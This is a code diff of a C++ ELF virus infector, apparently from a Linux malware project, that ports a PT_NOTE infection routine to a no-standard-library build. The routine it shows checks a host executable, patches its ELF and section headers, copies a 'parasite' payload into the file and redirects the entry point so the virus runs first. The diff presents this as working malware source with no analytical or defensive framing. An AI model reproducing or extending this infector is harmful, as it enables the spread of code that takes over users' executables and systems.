@@ -1,10 +1,10 @@
 #include "infector/pt_note_infect.hh"
-#include <linux/elf.h>
-#include <linux/limits.h>
+#include <elf.h>
 #include "common/file_descriptor.hh"
 #include "common/patch_pattern.hh"
 #include "common/patch_relinguish_control.hh"
-#include "std/string.hh"
+#include "nostdlib/stdio.hh"
+#include "nostdlib/string.hh"
 
 namespace vt::infector {
 
@@ -88,7 +88,7 @@ bool get_info(const Elf64_Ehdr& ehdr, const Elf64_Phdr& phdr,
 bool pt_note_infect64(vt::common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
                       vt::common::Mmap<PROT_READ> parasite_mapping) {
   const auto& ehdr = *reinterpret_cast<const Elf64_Ehdr*>(host_mapping.base());
-  if (ehdr.e_type != ET_EXEC && ehdr.e_type != ET_DYN ||
+  if ((ehdr.e_type != ET_EXEC && ehdr.e_type != ET_DYN) ||
       ehdr.e_ident[EI_CLASS] != ELFCLASS64) {
     return false;
   }
@@ -99,7 +99,7 @@ bool pt_note_infect64(vt::common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
   const auto& shdr =
       *reinterpret_cast<const Elf64_Shdr*>(host_mapping.base() + ehdr.e_shoff);
   if (!get_info(ehdr, phdr, shdr, info)) {
-    printf("Cannot correctly parse host elf phdr\n");
+    vt::printf("Cannot correctly parse host elf phdr\n");
     return false;
   }
 
@@ -119,7 +119,7 @@ bool pt_note_infect64(vt::common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
     auto& mutable_shdr = *reinterpret_cast<Elf64_Shdr*>(
         host_mapping.mutable_base() + ehdr.e_shoff);
     if (!patch_sht(ehdr, mutable_shdr, padded_virus_size, info)) {
-      printf("Failed to patch section header table\n");
+      vt::printf("Failed to patch section header table\n");
       return false;
     }
   }*/
@@ -130,13 +130,13 @@ bool pt_note_infect64(vt::common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
     patch_ehdr(mutable_ehdr, info, virus_offset);
   }
 
-  printf("inject parasite at %x loading at %x\n", virus_offset,
-         info.parasite_load_address);
-  printf("entry changed to %x\n", ehdr.e_entry);
+  vt::printf("inject parasite at %x loading at %x\n", virus_offset,
+             info.parasite_load_address);
+  vt::printf("entry changed to %x\n", ehdr.e_entry);
 
   // Inject the virus.
-  memcpy(host_mapping.mutable_base() + virus_offset, parasite_mapping.base(),
-         parasite_mapping.size());
+  vt::memcpy(host_mapping.mutable_base() + virus_offset,
+             parasite_mapping.base(), parasite_mapping.size());
 
   return patch_parasite_and_relinquish_control(
       ehdr.e_type, info.original_e_entry, info.parasite_load_address,
